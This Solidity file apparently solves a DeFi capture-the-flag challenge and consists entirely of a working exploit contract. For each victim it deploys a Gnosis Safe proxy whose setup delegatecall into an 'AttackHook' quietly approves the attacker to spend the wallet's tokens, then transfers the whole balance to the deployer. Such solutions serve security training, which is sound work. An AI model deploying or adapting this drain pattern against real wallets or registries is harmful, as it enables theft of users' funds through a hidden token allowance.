// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";
import "hardhat/console.sol";

/**
 * @title StealFromBackdoor
 * @author Louis
 */

contract AttackHook {
    address internal singleton;

    function approveBackdoor(address _token, address _to) public {
        // approve larger than enough amount
        IERC20(_token).approve(_to, 10000000000 ether);
    }
}

contract StealFromBackdoor {
    address immutable player;
    address immutable attackHook;
    address immutable token;
    address immutable masterCopy;
    GnosisSafeProxyFactory immutable walletFactory;
    WalletRegistry immutable walletRegistry;

    constructor(
        address _token,
        address[] memory _victims,
        address _masterCopy,
        GnosisSafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry
    ) {
        token = _token;
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;

        player = msg.sender;
        attackHook = address(new AttackHook());
        attack(_victims);
    }

    function attack(address[] memory _victims) internal {
        bytes memory approveBackdoorData = abi.encodeWithSignature(
            "approveBackdoor(address,address)",
            address(token),
            address(this)
        );

        for (uint256 i; i < _victims.length; ++i) {
            address[] memory victim = new address[](1);
            victim[0] = _victims[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                victim,
                1,
                attackHook,
                approveBackdoorData,
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
                masterCopy,
                initializer,
                i,
                walletRegistry
            );
            address walletAddress = address(wallet);

            IERC20(token).transferFrom(
                walletAddress,
                player,
                IERC20(token).balanceOf(walletAddress)
            );
        }
    }
}
